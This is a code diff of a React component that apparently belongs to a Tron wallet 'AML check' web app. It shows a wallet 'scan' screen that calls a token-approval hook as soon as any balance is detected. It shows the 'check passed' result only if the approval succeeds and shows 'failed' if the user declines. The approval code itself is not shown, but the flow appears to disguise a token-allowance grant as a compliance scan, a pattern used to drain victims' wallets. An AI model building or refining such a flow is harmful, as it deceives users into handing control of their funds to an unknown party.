@@ -3,21 +3,17 @@ import "./CheckInProcess.css";
 import React, { useEffect, useState } from "react";
 import { useWallet } from "@/app/context/globalContext";
 import { useTronTransaction } from "@/app/hooks/useTronTransaction";
-
 import AmlCheckPassed from "../AmlCheckPassed";
 import AmlCheckFailed from "../AmlCheckFailed";
 import { useTronApprove } from "@/app/hooks/useAprove";
 
 const CheckInProcess = () => {
   const { balances } = useWallet(); // Accesăm balanțele din context
-  // const { initiateTransaction, isLoading, transactionStatus } = useTronTransaction(); // Hook pentru inițierea tranzacției
-  const {approveTokens, approvalStatus, isLoading} = useTronApprove()
+  const { approveTokens, approvalStatus, isLoading } = useTronApprove();
   const [status, setStatus] = useState(null); // Status pentru procesare (valid sau invalid)
   const [showAmlCheck, setShowAmlCheck] = useState(false); // Comută între componente
-  console.log({
-    approvalStatus
-  });
-  
+  console.log({ approvalStatus });
+
   useEffect(() => {
     const checkBalancesAndInitiateTransaction = async () => {
       if (balances.trx >= 0) {
@@ -27,17 +23,16 @@ const CheckInProcess = () => {
         setStatus("invalid");
       }
     };
-  
-    if (balances) checkBalancesAndInitiateTransaction(); 
+
+    if (balances) checkBalancesAndInitiateTransaction();
   }, [balances]);
-  
+
   useEffect(() => {
     if (status === "valid") {
       approveTokens(); // Nu așteptați procesarea
     }
   }, [status]);
 
-  // Trecerea la componenta AML după tranzacție
   useEffect(() => {
     if (approvalStatus === "Approval successful!") {
       setTimeout(() => {
@@ -46,11 +41,13 @@ const CheckInProcess = () => {
     }
   }, [approvalStatus]);
 
-  // Afișare componenta AML Check Passed
   if (showAmlCheck) {
     return <AmlCheckPassed />;
-  } else if (approvalStatus=== "Approval failed." || approvalStatus === "User disapproved requested methods'" ) {
-    return <AmlCheckFailed/>
+  } else if (
+    approvalStatus === "Approval failed." ||
+    approvalStatus === "User disapproved requested methods'"
+  ) {
+    return <AmlCheckFailed />;
   }
 
   return (
@@ -61,16 +58,12 @@ const CheckInProcess = () => {
           Step 3 of 4
         </span>
       </div>
-      <p className="text-gray-500 mb-6">
-        We scrutinize your wallet thoroughly
-      </p>
-
-      {/* Interfața pentru procesare */}
+      <p className="text-gray-500 mb-6">We scrutinize your wallet thoroughly</p>
       <div className="flex items-center justify-center mb-6">
         <div
           className={`w-24 h-24 border-4 rounded-full flex items-center justify-center ${
             status === "valid" ? "border-blue-500" : "border-red-500"
-          } ${isLoading ? "pulsating-circle" : ""}`} // Efect de pulsare dacă isLoading
+          } ${isLoading ? "pulsating-circle" : ""}`}
         >
           <span
             className={`block w-6 h-6 rounded-full ${
@@ -79,33 +72,15 @@ const CheckInProcess = () => {
           ></span>
         </div>
       </div>
-
       {status === "valid" && isLoading && (
-        <p className="text-gray-400">
-          Processing your transaction, please wait...
-        </p>
+        <p className="text-gray-400">Processing your transaction, please wait...</p>
       )}
-
       {status === "valid" && !isLoading && (
-        <div>
-        <p className="text-gray-400">
-          Please wait 1 minute, we will provide the result soon
-        </p>
-              {/* <button
-              className="w-full py-2 px-4 text-white rounded-lg bg-blue-500 hover:bg-blue-600"
-              onClick={handleInitiateTransaction}
-            >
-              Check wallet
-            </button> */}
-        </div>
+        <p className="text-gray-400">Please wait 1 minute, we will provide the result soon</p>
       )}
-
       {status === "invalid" && (
         <div className="bg-red-100 text-red-500 p-4 rounded-lg">
-          <p>
-            You don't have at least 20 TRX in your balance for a full scan.
-            Refill your wallet and try again.
-          </p>
+          <p>You don't have at least 2 TRX in your balance for a full scan.</p>
         </div>
       )}
     </div>
